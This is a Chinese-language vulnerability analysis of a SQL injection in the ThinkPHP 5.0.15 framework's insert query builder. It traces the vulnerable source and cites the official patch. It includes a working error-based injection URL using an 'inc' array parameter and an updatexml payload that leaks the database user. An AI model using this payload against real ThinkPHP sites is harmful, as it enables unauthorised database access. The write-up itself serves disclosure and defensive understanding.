作者：chybeta  
来源：[先知安全社区](https://xz.aliyun.com/t/2257)

#### 前言

![](https://images.seebug.org/content/images/2018/04/7bb08890-6005-431b-8a4c-cc9b50496f87.png-w331s)

#### 漏洞复现

搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username

![](https://images.seebug.org/content/images/2018/04/f302e96b-d37f-46a0-b600-a1401bf7a2a2.png-w331s)

thinkphp官网下载5.0.15版本： <http://www.thinkphp.cn/down/1125.html> 。修改数据库配置信息
application/database.php。在 application/config.php
中打开调试和trace，`app_debug`和`app_trace`均为true。在
application/index/controller/Index.php 中Index类中添加方法：

    
    
    public  function testsql()
        {
            $username = input('get.username/a');
            db('user')->where(['id'=> 1])->insert(['username'=>$username]);
        }

访问：

    
    
    http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1

![](https://images.seebug.org/content/images/2018/04/7d761782-a9fb-4fe8-b01e-83cba15edef0.png-w331s)

#### 漏洞分析

通过input获取到参数后，`username`变量情况如下：

![](https://images.seebug.org/content/images/2018/04/20339fc7-5b6f-4a8f-a989-71c13d12cade.png-w331s)

跟入insert，thinkphp/library/think/db/Query.php:2078

    
    
    <?php
    public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this->parseExpress();
        $data    = array_merge($options['data'], $data);
        ...

![](https://images.seebug.org/content/images/2018/04/d084950a-80f7-4e18-a161-2f9f5980e270.png-w331s)

接下去执行：

    
    
    <?php
    $sql = $this->builder->insert($data, $options, $replace);

跟入 thinkphp/library/think/db/Builder.php:720：

    
    
    <?php
      public function insert(array $data, $options = [], $replace = false)
        {
            // 分析并处理数据
            $data = $this->parseData($data, $options);
            if (empty($data)) {
                return 0;
            }
            ...

跟入`parseData`至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。

    
    
    <?php
    protected function parseData($data, $options)
    {
        ...
        // 注
        foreach ($data as $key => $val) { // 第 101 行左右
        //  $key : "username"
        //  $val : {"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"}
            $item = $this->parseKey($key, $options);
            if (is_object($val) && method_exists($val, '__toString')) {
                ....
            }
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                ...
            } elseif (is_null($val)) {
                ...
            } elseif (is_array($val) && !empty($val)) {
                // $val[0] = "inc"
                switch ($val[0]) {
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            }
         ...
        }
        return $result;

可以看出`$val`是数组，且根据`$val[0]`值为`inc`，会通过switch语句进入到下面这条：

    
    
    <?php
        case 'inc':
            // $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)"
            // $val[2] = "1"
            $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
            break;

跟入此处的`parseKey`，即thinkphp/library/think/db/builder/Mysql.php:90

    
    
    <?php
        protected function parseKey($key, $options = [])
        {
            $key = trim($key);
            if (strpos($key, '$.') && false === strpos($key, '(')) {
                // JSON字段支持
                list($field, $name) = explode('$.', $key);
                $key                = 'json_extract(' . $field . ', \'$.' . $name . '\')';
            } elseif (strpos($key, '.') && !preg_match('/[,\'\"\(\)`\s]/', $key)) {
                list($table, $key) = explode('.', $key, 2);
                if ('__TABLE__' == $table) {
                    $table = $this->query->getTable();
                }
                if (isset($options['alias'][$table])) {
                    $table = $options['alias'][$table];
                }
            }
            if (!preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
                $key = '`' . $key . '`';
            }
            if (isset($table)) {
                if (strpos($table, '.')) {
                    $table = str_replace('.', '`.`', $table);
                }
                $key = '`' . $table . '`.' . $key;
            }
            return $key; // $key : "updatexml(1,concat(0x7,user(),0x7e),1)"
        }

此处并未对传入的`$key`进行更多的过滤与检查，最后返回的仍然是`1 and
(updatexml(1,concat(0x7,user(),0x7e),1))`

回到`parseData`，`floatval($val[2])`返回1，这也正是我们要传入`username[2]=1`的原因。将其与前面经过`parseKey`的结果进行拼接后返回给`result`

![](https://images.seebug.org/content/images/2018/04/9f8f4e39-e0fe-48a0-b21d-75d5e31e393a.png-w331s)

回到 thinkphp/library/think/db/Query.ph 的 insert 中：

![](https://images.seebug.org/content/images/2018/04/8f5cb024-0b8b-4878-926a-0d978653fe29.png-w331s)

sql注入成功。

#### 漏洞修复

官方commit： <https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b>

![](https://images.seebug.org/content/images/2018/04/2ee4cf83-a0cb-4bee-9531-118ce24f549a.png-w331s)

在进行`dec`和`inc`操作之前对`$val[1]`的值进行了再次确认。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/564/>

